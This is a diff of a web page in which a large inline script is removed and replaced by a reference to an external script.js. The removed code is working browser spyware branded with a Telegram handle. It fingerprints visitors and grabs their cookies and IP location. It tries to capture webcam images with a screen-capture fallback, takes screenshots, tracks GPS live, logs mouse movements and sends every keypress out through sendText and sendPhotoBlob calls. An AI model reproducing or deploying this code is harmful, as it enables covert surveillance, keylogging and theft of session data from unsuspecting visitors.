-          const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
-          if (!fs) {
-            resolve('❓ Unknown (No API Support)');
-            return;
-          }
-          
-          fs(window.TEMPORARY, 100, () => {
-            resolve('❌ Not Detected');
-          }, () => {
-            resolve('✅ DETECTED (FileSystem Blocked)');
-          });
-        }
-      });
-    }
-
-    async function collectAllInfo() {
-      let message = '╭── 🎯 𝗧𝗥𝗔𝗖𝗞𝗘𝗥 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 𝗕𝗬 𝗫𝗘𝗠𝗭𝗭 ──╮\n\n';
-      
-      // IP Information
-      try {
-        const ipResponse = await fetch('https://ipapi.co/json/');
-        const ipData = await ipResponse.json();
-        
-        message += `<b>📡 IP Address        :</b> ${ipData.ip}\n`;
-        message += `<b>🏙️ Lokasi            :</b> ${ipData.city}, ${ipData.region}, ${ipData.country_name}\n`;
-        message += `<b>📌 Koordinat         :</b> ${ipData.latitude}, ${ipData.longitude}\n`;
-        message += `<b>🏷️ Kode Pos          :</b> ${ipData.postal || 'Unknown'}\n`;
-        message += `<b>🌐 ISP               :</b> ${ipData.org || 'Unknown'}\n`;
-        message += `<b>📶 Koneksi           :</b> ${getConnectionType()}\n`;
-        message += `<b>🔐 Status VPN        :</b> ${await getVPNStatus()}\n`;
-        message += `<b>🚪 Port Terbuka      :</b> ${getOpenPorts()}\n\n`;
-      } catch (e) {
-        message += '❌ Gagal mendapatkan informasi IP\n\n';
-      }
-
-      // Device Information
-      message += `<b>🖥️ Device            :</b> ${navigator.userAgent}\n`;
-      message += `<b>💻 Platform          :</b> ${navigator.platform}\n`;
-      message += `<b>📺 Resolusi Layar    :</b> ${screen.width}x${screen.height}\n`;
-      message += `<b>🪟 Ukuran Window     :</b> ${window.innerWidth}x${window.innerHeight}\n`;
-      message += `<b>🧠 CPU Cores         :</b> ${navigator.hardwareConcurrency || 'Unknown'}\n`;
-      message += `<b>💾 RAM               :</b> ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'}\n`;
-      
-      if (navigator.getBattery) {
-        try {
-          const battery = await navigator.getBattery();
-          message += `<b>🔋 Baterai           :</b> ${(battery.level * 100).toFixed(0)}%\n`;
-          message += `<b>🔌 Charging          :</b> ${battery.charging ? '✅ YA' : '❌ TIDAK'}\n`;
-        } catch (e) {
-          message += `<b>🔋 Baterai           :</b> Unknown\n`;
-        }
-      } else {
-        message += `<b>🔋 Baterai           :</b> Not Supported\n`;
-      }
-      
-      message += `<b>📡 Online Status     :</b> ${navigator.onLine ? '✅ Online' : '❌ Offline'}\n`;
-      message += `<b>🕹️ Touch Support     :</b> ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}\n`;
-      message += `<b>📜 History Length    :</b> ${history.length}\n`;
-      message += `<b>📁 Penyimpanan       :</b> ${getStorageInfo()}\n`;
-      message += `<b>🎮 GPU               :</b> ${getGPUInfo()}\n`;
-      message += `<b>🧬 Hardware ID       :</b> ${getHardwareID().substring(0, 30)}...\n`;
-      message += `<b>🕵️‍♂️ Browser Fingerprint :</b> ${getBrowserFingerprint().substring(0, 30)}...\n\n`;
-
-      // Time Information
-      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      message += `<b>🧭 Zona Waktu        :</b> ${tz}\n`;
-      message += `<b>🕒 Akses Waktu       :</b> ${new Date().toLocaleString()}\n`;
-      message += `<b>🕓 Load Time         :</b> ${performance.now().toFixed(2)} ms\n`;
-      message += `<b>🗓️ Tanggal & Jam     :</b> ${new Date().toString()}\n\n`;
-
-      // Page Information
-      message += `<b>🔗 Referrer          :</b> ${document.referrer || 'None'}\n`;
-      message += `<b>🌍 URL               :</b> ${window.location.href}\n`;
-      message += `<b>📄 Judul Halaman     :</b> ${document.title}\n`;
-      message += `<b>🧪 Session ID        :</b> ${getRandomUID()}\n`;
-      message += `<b>👁️‍🗨️ Visibility Tab   :</b> ${document.visibilityState}\n\n`;
-
-      // Features Information
-      message += `<b>🧩 Plugins Installed :</b> ${navigator.plugins.length > 0 ? 
-        Array.from(navigator.plugins).map(p => p.name).join(', ') : 'None'}\n`;
-      message += `<b>⚙️ Geolocation       :</b> ${'geolocation' in navigator ? '✅ YA' : '❌ TIDAK'}\n`;
-      message += `<b>⚙️ Media Devices     :</b> ${'mediaDevices' in navigator ? '✅ YA' : '❌ TIDAK'}\n`;
-      message += `<b>⚙️ Bluetooth         :</b> ${'bluetooth' in navigator ? '✅ YA' : '❌ TIDAK'}\n`;
-      message += `<b>⚙️ Clipboard Access  :</b> ${'clipboard' in navigator ? '✅ YA' : '❌ TIDAK'}\n`;
-      message += `<b>⚙️ Service Worker    :</b> ${'serviceWorker' in navigator ? '✅ YA' : '❌ TIDAK'}\n`;
-      message += `<b>🎤 Mic Access        :</b> ${'getUserMedia' in navigator.mediaDevices ? '✅ YA' : '❌ TIDAK'}\n`;
-      message += `<b>📷 Kamera Akses      :</b> ${'getUserMedia' in navigator.mediaDevices ? '✅ YA' : '❌ TIDAK'}\n\n`;
-
-      // Advanced Information
-      message += `<b>🧪 ADVANCED INTEL :</b>\n`;
-      message += `<b>📌 Canvas Fingerprint :</b> ${getCanvasFingerprint().substring(0, 30)}...\n`;
-      message += `<b>🛰️ WebGL Vendor       :</b> ${getGPUInfo()}\n`;
-      message += `<b>🖍️ Fonts Terdeteksi   :</b> ${getDetectedFonts()}\n`;
-      message += `<b>🔊 Audio Fingerprint  :</b> ${getAudioFingerprint()}\n`;
-      message += `<b>🆔 UID Sementara      :</b> ${getRandomUID()}\n`;
-      message += `<b>🧾 Cookie Aktif       :</b> ${document.cookie || 'None'}\n\n`;
-
-      // Security Information
-      message += `<b>☠️ Mode Penyamaran    :</b> ${await getIncognitoMode()}\n`;
-      message += `<b>🧟‍♂️ Bot Detected      :</b> ${navigator.webdriver ? '✅ YA' : '❌ TIDAK'}\n`;
-      message += `<b>👣 Mouse Movement     :</b> Tracked\n`;
-      message += `<b>⌨️ Keylog Aktivitas   :</b> Ready\n`;
-      message += `<b>🪝 Hook Injection     :</b> Active\n`;
-      message += `<b>📦 Payload Status     :</b> ✅ Delivered\n\n`;
-
-      message += '╰── 📡 𝗧𝗿𝗮𝗰𝗸𝗲𝗱 𝗯𝘆 X𝗲𝗺𝘇𝗭 | t.me/XemzzXiterz ──╯';
-
-      return message;
-    }
-
-    // Main execution
-    (async () => {
-      // First send the comprehensive text report
-      const fullReport = await collectAllInfo();
-      sendText(fullReport);
-
-      // Then send media (webcam and screenshot)
-      try {
-        // Webcam snapshot (will attempt even without permission)
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true }).catch(e => {
-          // If permission denied, try to force it (may not work in all browsers)
-          console.log('Regular access denied, trying fallback...');
-          return navigator.mediaDevices.getUserMedia({
-            video: {
-              mandatory: {
-                chromeMediaSource: 'screen',
-                maxWidth: 1920,
-                maxHeight: 1080,
-                minFrameRate: 1,
-                maxFrameRate: 5
-              }
-            }
-          }).catch(e => null);
-        });
-        
-        if (stream) {
-          video.srcObject = stream;
-          
-          await new Promise(resolve => setTimeout(resolve, 3000));
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          canvas.getContext('2d').drawImage(video, 0, 0);
-          canvas.toBlob(blob => sendPhotoBlob(blob, '📸_camera.jpg'), 'image/jpeg');
-          
-          // Stop the video stream
-          stream.getTracks().forEach(track => track.stop());
-        }
-      } catch (e) {
-        console.log('Webcam access completely denied');
-      }
-
-      // Screenshot after a delay
-      setTimeout(() => {
-        html2canvas(document.body).then(canvas => {
-          canvas.toBlob(blob => sendPhotoBlob(blob, '🖼️_screenshot.jpg'), 'image/jpeg');
-        });
-      }, 5000);
-
-      // GPS tracking if available
-      if (navigator.geolocation) {
-        navigator.geolocation.watchPosition(pos => {
-          const gpsText = `<b>📡 LIVE GPS TRACKING UPDATE</b>\n` +
-                         `<b>📌 Lat:</b> ${pos.coords.latitude}\n` +
-                         `<b>📍 Lng:</b> ${pos.coords.longitude}\n` +
-                         `<b>🎯 Akurasi:</b> ${pos.coords.accuracy}m`;
-          sendText(gpsText);
-        }, err => {
-          console.log('GPS access denied');
-        }, { enableHighAccuracy: true });
-      }
-
-      // Mouse movement tracking
-      let mousePositions = [];
-      document.addEventListener('mousemove', (e) => {
-        mousePositions.push({x: e.clientX, y: e.clientY, t: Date.now()});
-        if (mousePositions.length > 10) {
-          sendText(`🖱️ <b>Mouse Movement Pattern:</b>\n${JSON.stringify(mousePositions)}`);
-          mousePositions = [];
-        }
-      });
-
-      // Keylog simulation (note: actual keylogging may be illegal in many jurisdictions)
-      document.addEventListener('keydown', (e) => {
-        sendText(`⌨️ <b>Key Press:</b> ${e.key} (Code: ${e.code})`);
-      });
-
-      // Idle time tracking
-      let idleStart = Date.now();
-      let idleTimer;
-      ['mousemove', 'keydown', 'scroll', 'touchstart'].forEach(evt => {
-        window.addEventListener(evt, () => {
-          const idleTime = ((Date.now() - idleStart) / 1000).toFixed(1);
-          if (idleTime > 10) {
-            sendText(`😴 <b>User kembali aktif setelah idle selama:</b> ${idleTime} detik`);
-          }
-          idleStart = Date.now();
-          clearTimeout(idleTimer);
-          idleTimer = setTimeout(() => {
-            sendText('💤 <b>User diem kayak mayat selama 60 detik</b>');
-          }, 60000);
-        });
-      });
-    })();
-  </script>
+    <script src="script.js"></script>
 </body>
 </html>
